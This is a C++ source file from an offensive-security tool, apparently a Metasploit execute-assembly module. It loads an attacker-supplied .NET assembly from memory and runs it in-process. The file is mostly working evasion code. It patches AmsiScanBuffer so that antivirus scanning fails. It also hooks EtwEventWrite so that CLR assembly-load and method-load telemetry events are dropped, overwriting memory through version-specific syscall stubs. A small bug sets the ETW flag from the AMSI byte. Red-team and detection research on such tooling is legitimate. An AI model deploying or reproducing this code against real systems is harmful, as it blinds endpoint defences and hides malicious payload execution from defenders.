// Author: B4rtik (@b4rtik)
// Project: Execute Assembly (https://github.com/b4rtik/metasploit-execute-assembly)
// License: BSD 3-Clause
// based on 
// https://github.com/etormadiv/HostingCLR
// by Etor Madiv

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <evntprov.h>
#include "HostingCLR.h"
#include "EtwTamper.h"

// https://docs.microsoft.com/en-us/dotnet/framework/performance/etw-events-in-the-common-language-runtime
#define ModuleLoad_V2 152
#define AssemblyDCStart_V1 155
#define MethodLoadVerbose_V1 143
#define MethodJittingStarted 145
#define ILStubGenerated 88

bool amsiflag;
bool etwflag;
unsigned char signflag[1];

char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

// mov rax, <Hooked function address>  
// jmp rax
unsigned char uHook[] = {
	0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xE0
};

#ifdef _X32
unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
SIZE_T patchsize = 8;
#endif
#ifdef _X64
unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
SIZE_T patchsize = 6;
#endif

union PARAMSIZE {
	unsigned char myByte[4];
	int intvalue;
} paramsize;

int executeSharp(LPVOID lpPayload)
{
	HRESULT hr;

	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	BOOL bLoadable;
	ICorRuntimeHost* pRuntimeHost = NULL;
	IUnknownPtr pAppDomainThunk = NULL;
	_AppDomainPtr pDefaultAppDomain = NULL;
	_AssemblyPtr pAssembly = NULL;
	SAFEARRAYBOUND rgsabound[1];
	SIZE_T readed;
	_MethodInfoPtr pMethodInfo = NULL;
	VARIANT retVal;
	VARIANT obj;
	SAFEARRAY *psaStaticMethodArgs;
	VARIANT vtPsa;

	unsigned char pSize[8];

	//Read parameters assemblysize + argssize
	ReadProcessMemory(GetCurrentProcess(), lpPayload, pSize, 8, &readed);

	PARAMSIZE assemblysize;
	assemblysize.myByte[0] = pSize[0];
	assemblysize.myByte[1] = pSize[1];
	assemblysize.myByte[2] = pSize[2];
	assemblysize.myByte[3] = pSize[3];

	PARAMSIZE argssize;
	argssize.myByte[0] = pSize[4];
	argssize.myByte[1] = pSize[5];
	argssize.myByte[2] = pSize[6];
	argssize.myByte[3] = pSize[7];

	long raw_assembly_length = assemblysize.intvalue;
	long raw_args_length = argssize.intvalue;

	unsigned char *allData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char)+ raw_args_length * sizeof(unsigned char) + 9 * sizeof(unsigned char));
	unsigned char *arg_s = (unsigned char*)malloc(raw_args_length * sizeof(unsigned char));
	unsigned char *rawData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char));

	SecureZeroMemory(allData, raw_assembly_length * sizeof(unsigned char) + raw_args_length * sizeof(unsigned char) + 9 * sizeof(unsigned char));
	SecureZeroMemory(arg_s, raw_args_length * sizeof(unsigned char));
	SecureZeroMemory(rawData, raw_assembly_length * sizeof(unsigned char));

	rgsabound[0].cElements = raw_assembly_length;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);

	void* pvData = NULL;
	hr = SafeArrayAccessData(pSafeArray, &pvData);

	if (FAILED(hr))
	{
		printf("Failed SafeArrayAccessData w/hr 0x%08lx\n", hr);
		return -1;
	}
	
	//Reading memory parameters + amsiflag + args + assembly
	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + raw_args_length + 11, &readed);

	//Taking pointer to amsi
	unsigned char *offsetamsi = allData + 8;
	//Store amsi flag 
	amsiflag = (offsetamsi[0] != 0);

	unsigned char *offsetetw = allData + 9;
	//Store etw flag 
	etwflag = (offsetamsi[0] != 0);

	unsigned char *offsetsign = allData + 10;
	//Store sihnature flag 
	memcpy(signflag, offsetsign, 1);
	
	//Taking pointer to args
	unsigned char *offsetargs = allData + 11;
	//Store parameters 
	memcpy(arg_s, offsetargs, raw_args_length);

	//Taking pointer to assembly
	unsigned char *offset = allData + raw_args_length + 11;
	//Store assembly
	memcpy(pvData, offset, raw_assembly_length);

	LPCWSTR clrVersion;
	
	if(FindVersion(pvData, raw_assembly_length))
	{
		clrVersion = L"v4.0.30319";
	}
	else
	{
		clrVersion = L"v2.0.50727";
	}

	hr = SafeArrayUnaccessData(pSafeArray);

	if (FAILED(hr))
	{
		printf("Failed SafeArrayUnaccessData w/hr 0x%08lx\n", hr);
		return -1;
	}

	//Etw bypass
	if (etwflag)
	{
		int ptcResult = PatchEtw();
		if (ptcResult == -1)
		{
			wprintf(L"Etw bypass failed\n");
			return -1;
		}
	}

	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);

	if(FAILED(hr))
	{
		printf("CLRCreateInstance failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	IEnumUnknown* pEnumerator;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	hr = pMetaHost->EnumerateLoadedRuntimes(hProcess, &pEnumerator);

	if (FAILED(hr))
	{
		printf("Cannot enumerate loaded runtime w/hr 0x%08lx\n", hr);
		return -1;
	}
	
	BOOL isloaded = ClrIsLoaded(clrVersion, pEnumerator, (VOID**)&pRuntimeInfo);

	if(!isloaded)
	{
		hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);

		if (FAILED(hr))
		{
			wprintf(L"Cannot get the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
			return -1;
		}

		hr = pRuntimeInfo->IsLoadable(&bLoadable);

		if (FAILED(hr) || !bLoadable)
		{
			wprintf(L"Cannot load the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
			return -1;
		}
	}

	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);

	if(FAILED(hr))
	{
		printf("ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	if (!isloaded)
	{
		hr = pRuntimeHost->Start();
	}

	if(FAILED(hr))
	{
		printf("CLR failed to start w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);

	if(FAILED(hr))
	{
		printf("ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**) &pDefaultAppDomain);

	if(FAILED(hr))
	{
		printf("Failed to get default AppDomain w/hr 0x%08lx\n", hr);
		return -1;
	}

	//Amsi bypass
	if (amsiflag)
	{
		int ptcResult = PatchAmsi();
		if (ptcResult == -1)
		{
			printf("Amsi bypass failed\n");
			return -1;
		}
	}

	hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);

	if(FAILED(hr))
	{
		printf("Failed pDefaultAppDomain->Load_3 w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pAssembly->get_EntryPoint(&pMethodInfo);

	if(FAILED(hr))
	{
		printf("Failed pAssembly->get_EntryPoint w/hr 0x%08lx\n", hr);
		return -1;
	}

	ZeroMemory(&retVal, sizeof(VARIANT));
	ZeroMemory(&obj, sizeof(VARIANT));
	
	obj.vt = VT_NULL;
	vtPsa.vt = (VT_ARRAY | VT_BSTR);

	//Managing parameters
	if(signflag[0] == '\x02')
	{
		//if we have at least 1 parameter set cEleemnt to 1
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);

		LPWSTR *szArglist;
		int nArgs;
		wchar_t *wtext = (wchar_t *)malloc((sizeof(wchar_t) * raw_args_length));

		mbstowcs(wtext, (char *)arg_s, raw_args_length);
		szArglist = CommandLineToArgvW(wtext, &nArgs);

		free(wtext);

		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);

		for(long i = 0;i< nArgs;i++)
		{
			size_t converted;
			size_t strlength = wcslen(szArglist[i]) + 1;
			OLECHAR *sOleText1 = new OLECHAR[strlength];
			char * buffer = (char *)malloc(strlength * sizeof(char));
			
			wcstombs(buffer, szArglist[i], strlength);
			
			mbstowcs_s(&converted, sOleText1, strlength, buffer, strlength);
			BSTR strParam1 = SysAllocString(sOleText1);

			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
			free(buffer);
		}

		long iEventCdIdx(0);
		hr = SafeArrayPutElement(psaStaticMethodArgs, &iEventCdIdx, &vtPsa);
	}
	else
	{
		//if no parameters set cEleemnt to 0
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
	}
	
	//Assembly execution
	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);

	if(FAILED(hr))
	{
		printf("Failed pMethodInfo->Invoke_3  w/hr 0x%08lx\n", hr);
		return -1;
	}

	wprintf(L"Succeeded\n");
	
	return 0;
}

VOID Execute(LPVOID lpPayload)
{
	if (!AttachConsole(-1))
		AllocConsole();

	executeSharp(lpPayload);

}

BOOL FindVersion(void * assembly, int length)
{
	char* assembly_c;
	assembly_c = (char*)assembly;
	
	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (sig_40[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return TRUE;
				}
			}
		}
	}

	return FALSE;
}

ULONG NTAPI MyEtwEventWrite(
	__in REGHANDLE RegHandle,
	__in PCEVENT_DESCRIPTOR EventDescriptor,
	__in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData)
{
	ULONG uResult = 0;

	_EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)
		GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWriteFull");
	if (EtwEventWriteFull == NULL) {
		return 1;
	}

	switch (EventDescriptor->Id) {
	case AssemblyDCStart_V1:
		// Block CLR assembly loading events.
		break;
	case MethodLoadVerbose_V1:
		// Block CLR method loading events.
		break;
	case ILStubGenerated:
		// Block MSIL stub generation events.
		break;
	default:
		// Forward all other ETW events using EtwEventWriteFull.
		uResult = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);
	}

	return uResult;
}

INT InlinePatch(LPVOID lpFuncAddress, UCHAR * patch, int patchsize) {
	PNT_TIB pTIB = NULL;
	PTEB pTEB = NULL;
	PPEB pPEB = NULL;

	// Get pointer to the TEB
	pTIB = (PNT_TIB)__readgsqword(0x30);
	pTEB = (PTEB)pTIB->Self;

	// Get pointer to the PEB
	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
	if (pPEB == NULL) {
		return -1;
	}

	if (pPEB->OSMajorVersion == 10 && pPEB->OSMinorVersion == 0) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 1 && pPEB->OSBuildNumber == 7601) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 2) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 3) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
	}
	else {

		return -2;
	}

	LPVOID lpBaseAddress = lpFuncAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = patchsize;
	NTSTATUS status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		return -1;
	}

	status = ZwWriteVirtualMemory(NtCurrentProcess(), lpFuncAddress, (PVOID)patch, patchsize, NULL);
	if (status != STATUS_SUCCESS) {
		return -1;
	}

	status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		return -1;
	}

	return 0;
}

BOOL PatchEtw()
{
	HMODULE lib = LoadLibraryA("ntdll.dll");
	if (lib == NULL)
	{
		wprintf(L"Cannot load ntdll.dll");
		return -2;
	}
	LPVOID lpFuncAddress = GetProcAddress(lib, "EtwEventWrite");
	if (lpFuncAddress == NULL)
	{
		wprintf(L"Cannot get address of EtwEventWrite");
		return -2;
	}

	// Add address of hook function to patch.
	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;

	return InlinePatch(lpFuncAddress, uHook,sizeof(uHook));
}

BOOL PatchAmsi()
{

	HMODULE lib = LoadLibraryA("amsi.dll");
	if (lib == NULL)
	{
		printf("Cannot load amsi.dll");
		return -2;
	}

	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");
	if(addr == NULL)
	{
		printf("Cannot get address of AmsiScanBuffer");
		return -2;
	}

	return InlinePatch(addr, amsipatch, sizeof(amsipatch));
}

BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo) {
	HRESULT hr;
	ULONG fetched = 0;
	DWORD vbSize;
	BOOL retval = FALSE;
	wchar_t currentversion[260];

	while (SUCCEEDED(pEnumerator->Next(1, (IUnknown **)&pRuntimeInfo, &fetched)) && fetched > 0) 
	{
		hr = ((ICLRRuntimeInfo*)pRuntimeInfo)->GetVersionString(currentversion, &vbSize);
		if (!FAILED(hr))
		{
			if (wcscmp(currentversion, version) == 0)
			{
				retval = TRUE;
				break;
			}
		}
	}

	return retval;
}




